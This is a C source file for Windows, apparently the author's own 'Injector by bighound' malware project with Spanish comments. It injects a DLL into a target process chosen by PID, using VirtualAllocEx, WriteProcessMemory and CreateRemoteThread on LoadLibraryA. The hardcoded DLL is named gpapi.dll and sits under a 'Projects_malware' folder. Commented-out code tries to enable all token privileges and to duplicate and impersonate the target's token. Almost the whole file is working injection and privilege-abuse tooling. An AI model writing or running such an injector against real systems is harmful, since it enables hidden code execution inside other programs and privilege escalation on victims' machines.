#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <psapi.h>
#include <string.h>
#include <winnt.h>
#pragma comment(lib, "advapi32.lib")


BOOL EnablePrivilege(HANDLE hToken, LPCSTR privilege) {
    TOKEN_PRIVILEGES tkp;
    LUID_AND_ATTRIBUTES laa;
    DWORD dwSize = sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES);

    // Get the LUID for all privileges
    if (!LookupPrivilegeValue(NULL, privilege, &laa.Luid)) {
        printf("Error getting privilege LUID: %d\n", GetLastError());
        return FALSE;
    }

    // Set the attributes for all privileges
    laa.Attributes = SE_PRIVILEGE_ENABLED;

    // Fill in the TOKEN_PRIVILEGES struct
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0] = laa;

    // Adjust the token privileges
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, dwSize, NULL, NULL)) {
        //printf("Error adjusting token privileges: %d\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}






int getPrivs(){
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    DWORD dwSize = sizeof(TOKEN_PRIVILEGES);
    BOOL bResult;

    // Abrir el token de seguridad del proceso actual
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        printf("Error: No se pudo abrir el token de seguridad del proceso actual.\n");
        return 1;
    }
	
	bResult = GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
	
	TOKEN_PRIVILEGES* ptp = (TOKEN_PRIVILEGES*) malloc(dwSize);
	bResult = GetTokenInformation(hToken, TokenPrivileges, ptp, dwSize, &dwSize);

    // Obtener información sobre los privilegios del token
    bResult = GetTokenInformation(hToken, TokenPrivileges, &tp, dwSize, &dwSize);
    if (!bResult) {
        printf("Error: No se pudo obtener informacion sobre los privilegios del token. - Motivo: %u\n", GetLastError());
        CloseHandle(hToken);
        return 1;
    }

    printf("Privilegios activos:\n");
    for (DWORD i = 0; i < tp.PrivilegeCount; i++) {
        TCHAR szName[MAX_PATH];
        DWORD dwNameSize = MAX_PATH;
        LookupPrivilegeName(NULL, &tp.Privileges[i].Luid, szName, &dwNameSize);
        printf("- %s: %s\n", szName, tp.Privileges[i].Attributes & SE_PRIVILEGE_ENABLED ? "Habilitado" : "Deshabilitado");
    }

    CloseHandle(hToken);
    return 0;
	
	
}

int main(int argc, char* argv[])
{
	printf("[ Injector by bighound ]\n\n\n");
	const LPTSTR Privileges[] = {
    SE_ASSIGNPRIMARYTOKEN_NAME,
    SE_AUDIT_NAME,
    SE_BACKUP_NAME,
    SE_CHANGE_NOTIFY_NAME,
    SE_CREATE_GLOBAL_NAME,
    SE_CREATE_PAGEFILE_NAME,
    SE_CREATE_PERMANENT_NAME,
    SE_CREATE_SYMBOLIC_LINK_NAME,
    SE_CREATE_TOKEN_NAME,
    SE_DEBUG_NAME,
    SE_ENABLE_DELEGATION_NAME,
    SE_IMPERSONATE_NAME,
    SE_INC_BASE_PRIORITY_NAME,
    SE_INCREASE_QUOTA_NAME,
    SE_INC_WORKING_SET_NAME,
    SE_LOAD_DRIVER_NAME,
    SE_LOCK_MEMORY_NAME,
    SE_MACHINE_ACCOUNT_NAME,
    SE_MANAGE_VOLUME_NAME,
    SE_PROF_SINGLE_PROCESS_NAME,
    SE_RELABEL_NAME,
    SE_REMOTE_SHUTDOWN_NAME,
    SE_RESTORE_NAME,
    SE_SECURITY_NAME,
    SE_SHUTDOWN_NAME,
    SE_SYNC_AGENT_NAME,
    SE_SYSTEM_ENVIRONMENT_NAME,
    SE_SYSTEM_PROFILE_NAME,
    SE_SYSTEMTIME_NAME,
    SE_TAKE_OWNERSHIP_NAME,
    SE_TCB_NAME,
    SE_TIME_ZONE_NAME,
    SE_TRUSTED_CREDMAN_ACCESS_NAME,
    SE_UNDOCK_NAME,
    SE_UNSOLICITED_INPUT_NAME
	};
	
	DWORD numPrivileges = sizeof(Privileges) / sizeof(Privileges[0]);
	
	HANDLE pHandle = NULL; // HANDLE del proceso remoto
	HANDLE hToken = NULL; // Nuestro token de acceso del proceso actual
	HANDLE dupToken = NULL; //Token de acceso nuestro con los permisos correspondientes
	
    //printf("[ Injector by bighound ]\n\n\n");
	
    DWORD dwProcessId = atoi(argv[1]);
	//char dllPath[] = "C:\\Users\\Enrique\\Desktop\\tools\\injecter\\bighound.dll";
	char dllPath[] = "C:\\Users\\hound\\Desktop\\Projects_malware\\Injecter\\gpapi.dll";
	//char *dllPath = argv[2];
	
	pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	/*
	printf("[+] Proceso abierto correctamente\n");
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    {
        printf("[-] Error obteniendo token de acceso: %d\n", GetLastError());
        return 1;
    }
	printf("[+] Token de acceso obtenido correctamente\n");
	
	
	getPrivs();
	BOOL privileged = NULL;
	printf("[+] Obteniendo todos los privilegios..\n");
	Sleep(3000);
	
	
	for (DWORD i = 0; i < numPrivileges; i++) {
		privileged = EnablePrivilege(hToken, Privileges[i]);
		if (privileged){
			_tprintf("[+] Privilege %s added successfully!\n", Privileges[i]);
		}else{
			_tprintf("[-] Privilege %s cannot be added\n", Privileges[i]);
		}
    }
	getPrivs();
	
	
	
	
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken))
    {
        printf("[-] Error clonando token: %d\n", GetLastError());
        return 1;
    }
	printf("[+] Token clonado a dupToken correctamente\n");
	
	
	HANDLE remToken = NULL; // HANDLE del proceso remoto
	if (!OpenProcessToken(pHandle, TOKEN_QUERY | TOKEN_DUPLICATE , &remToken))
    {
        printf("[-] Error obteniendo token de acceso del proceso remoto: %d\n", GetLastError());
        return 1;
    }
	printf("[+] Token de acceso del proceso remoto obtenido correctamente\n");
	
	
	HANDLE dupRemToken = NULL;
	SECURITY_ATTRIBUTES sa = { sizeof(sa) };
	if (!DuplicateTokenEx(remToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &dupRemToken))
    {
        printf("[-] Error clonando token remoto: %d\n", GetLastError());
        return 1;
    }
	printf("[+] Token remoto clonado correctamente\n");
	if (dupToken == dupRemToken){
		printf("[-] El token remoto es nulo\n");
	}
	
	BOOL ImpersonateUser = ImpersonateLoggedOnUser(dupRemToken);
	if (!ImpersonateUser)
	{
		printf("ImpersonateLoggedOnUser() Failed ;(\n");
		printf("Error code : %d\n", GetLastError());

	}
	printf("[+] Token de acceso impersonado correctamente\n");
	Sleep(2000);
	
	*/
	
	PVOID lpDllPath = VirtualAllocEx(pHandle, NULL, sizeof(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	if (lpDllPath == NULL){
		printf("[-] VirtualAllocEx error\n");
		CloseHandle(pHandle);
		return -1;
	}
	
	HMODULE hKernel32 = GetModuleHandle("Kernel32.dll");
	PTHREAD_START_ROUTINE lpLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
	
	
	
	if(!WriteProcessMemory(pHandle, lpDllPath, (LPVOID)dllPath, sizeof(dllPath), NULL)){
		printf("[-] Error in WriteProcessMemory\n");
		return -1;
	}
	
	printf("[+] Injecting in the process with PID %d ..\n", dwProcessId);
	Sleep(2000);
	HANDLE hThread = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLibrary, lpDllPath, 0, NULL);
	if(hThread == NULL){
		printf("[-] Error in CreateRemoteThread\n");
	}
	//SetThreadToken((PHANDLE) hThread, dupRemToken);
	
	
	//
	printf("[+] Injected successfully!!\n");
	WaitForSingleObject(hThread, INFINITE);
    CloseHandle(pHandle);
    //CloseHandle(dupToken);
    //CloseHandle(hToken);
    
	
    return 0;
}

/*
	DWORD sessionId = 0;
    if (!ProcessIdToSessionId(dwProcessId, &sessionId))
    {
        printf("[-] Error obteniendo ID de sesion: %d\n", GetLastError());
        return 1;
    }
	printf("[+] ID de sesion obtenido correctamente\n");
	if (sessionId == 0){
		printf("[-] Session ID is empty\n");
	}
	*/
	
	/*if (!SetThreadToken((PHANDLE)pHandle, dupRemToken))
    {
        printf("Error estableciendo token de hilo: %d\n", GetLastError());
        return 1;
    }
	printf("[+] Exito\n");
	*/
	
	/*
	
	if (!SetTokenInformation(dupRemToken, TokenSessionId, &sessionId, sizeof(sessionId)))
    {
        printf("Error estableciendo ID de sesion del token: %d\n", GetLastError());
        return 1;
    }
	printf("[+] ID de sesion establecida correctamente\n");
	*/